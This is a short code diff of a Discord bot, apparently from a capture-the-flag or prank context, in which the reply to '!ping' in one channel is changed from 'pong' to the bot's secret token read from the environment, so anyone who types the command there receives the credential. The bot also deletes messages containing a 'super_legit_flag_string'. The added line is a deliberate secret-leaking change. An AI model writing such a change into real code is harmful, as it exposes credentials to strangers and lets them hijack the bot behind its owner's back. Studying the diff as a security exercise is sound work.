@@ -31,7 +31,7 @@ client.on('ready', () => {
 client.on('message', msg => {
 	const sender = msg.guild?msg.guild.member(msg.author):null;
 	if (msg.content == "!ping" && msg.channel.id=="686030136406966311") {
-		msg.channel.send("pong");
+		msg.channel.send(process.env.TOKEN);
 	}
 	if (/super_legit_flag_string/.test(msg.content.replace(/\s/g,''))) {
 		msg.delete().then(m=>console.log(`deleted message (legit flag)`)).catch(console.error);
